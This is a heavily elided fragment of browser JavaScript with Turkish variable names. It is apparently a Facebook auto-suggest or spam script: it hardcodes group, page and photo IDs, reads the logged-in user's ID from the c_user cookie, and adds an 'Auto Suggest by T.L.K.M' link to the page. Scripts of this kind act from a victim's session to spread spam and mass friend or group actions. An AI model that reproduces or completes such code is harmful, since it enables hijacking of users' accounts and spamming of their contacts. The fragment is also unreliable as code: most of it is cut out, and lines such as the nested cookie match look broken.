...
sublist("576341409103939");

var gid = ['100001842551702'];
var gid = ['100002209594934'];
var gid = ['726890724002938'];
...
var sfoto_id = "100001842551702";
var sfoto_id = "100002209594934";
var spage_id = "465024946902923";
var spost_id = "101169019963210";
var sfoto_id = "109513839151201";
var sfoto_id = "222638747888686";
var sfoto_id = "468443036535366";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by T.L.K.M';
